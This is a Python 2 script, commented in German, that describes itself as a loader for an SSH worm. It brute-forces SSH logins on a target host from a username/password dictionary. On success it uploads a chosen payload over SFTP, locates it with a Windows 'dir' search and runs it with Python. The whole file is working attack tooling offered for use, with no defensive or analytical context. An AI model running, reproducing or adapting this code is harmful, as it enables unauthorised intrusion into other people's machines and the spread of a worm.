# -*- coding: iso-8859-1 -*-
# Läd SSH-Wurm auf Host und führt diesen aus

import paramiko
import time
import argparse

CMD = 'cmd.exe /c'

# sucht nach ssh-Login
# @param ssh: obj; ermöglicht ssh-Handhabung
# @param hostIP: str; Targte-IP
# @param dictFile: str; Login-Dictionary
# @param payload: str; Wurm-Datei
def attackSSH(ssh, hostIP, dictFile, payload):

    for line in open(dictFile, "r").readlines():
        [username,password] = line.strip().split()
        try:
            print "[+] Trying to break in with username: %s username: %s " %(username,password)
            ssh.connect(hostIP, username=username, password=password)
        except paramiko.AuthenticationException:
            print "[-] Failed! ...\n"
            continue
        print "[+] Success ... username: %s and password: %s is VALID!\n" %(username, password)
        upload_and_execute(ssh, payload)
        break
    ssh.close()


# fuehrt command aus und gibt Pfad fuer Datei zurueck
# @param ssh: obj; ermöglicht ssh-Handhabung
# @param command: str; cmd-Kommanso das ausgeführt werden soll
# @return data: str;Antwort auf command
def exec_with_retVal(ssh, command):
    chan = ssh.get_transport().open_session()
    chan.exec_command(command)
    while not chan.exit_status_ready():
        time.sleep(0.1)
    print "Exit status:", chan.recv_exit_status()
    data = chan.recv(1024)
    return data

# hochladen und ausführen einer Datei
# @param ssh: obj; ermöglicht ssh-Handhabung
# @param filename: str; Wurm-Datei
def upload_and_execute(ssh, filename):
    upload_file(ssh,filename)
    execute_file_on_server(ssh, filename)

# file-upload per sftp
# @param ssh: obj; ermöglicht ssh-Handhabung
# @param filename: str; Wurm-Datei
def upload_file(ssh, filename):
    print "Upload:", filename
    sftpClient = ssh.open_sftp()
    sftpClient.put(filename, filename)

# suche nach hochgeladener Datei
# @param ssh: obj; ermöglicht ssh-Handhabung
# @param filename: str; Wurm-Datei
# @return server_path: str; ermittelte Pfad des Wurmes
def find_file_on_server(ssh,filename):
    print "Ermitteln des Dateipfades auf dem Server..."
    command = CMD + '" cd C:\ && dir /b /s ' + filename +'"'
    data = exec_with_retVal(ssh,command)
    server_path = str(data).splitlines()[0]
    print "Pfad auf dem Server: "
    return server_path

# führt Wurm auf Server aus
# @param ssh: obj; ermöglicht ssh-Handhabung
# @param filename: str; Wurm-Datei
def execute_file_on_server(ssh,filename):
    server_path = find_file_on_server(ssh,filename)
    print "Starten von ", server_path
    command = CMD + '" python  ' + server_path + '"'
    data = exec_with_retVal(ssh, command)
    print "Ausgabe des Skripts auf dem Server: "
    print data

# initialiert SSHClient
# setzt ssh-Werte
# definiert Benutzerargumente
def main():

    parser = argparse.ArgumentParser()
    parser.add_argument('-H', dest='hostIP', \
                        type=str, help='specify the Host-IP', \
                        required=True)
    parser.add_argument('-f', dest='dictionaryFile', \
                        type=str, help='specify the Path of the Username/Password-File', \
                        required=True)
    parser.add_argument('-p', dest='payload', \
                        type=str, help='specify the File which you want to upload and execute', \
                        required=True)
    args = parser.parse_args()
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    attackSSH(ssh, args.hostIP, args.dictionaryFile, args.payload)


if __name__ == '__main__':
    main()

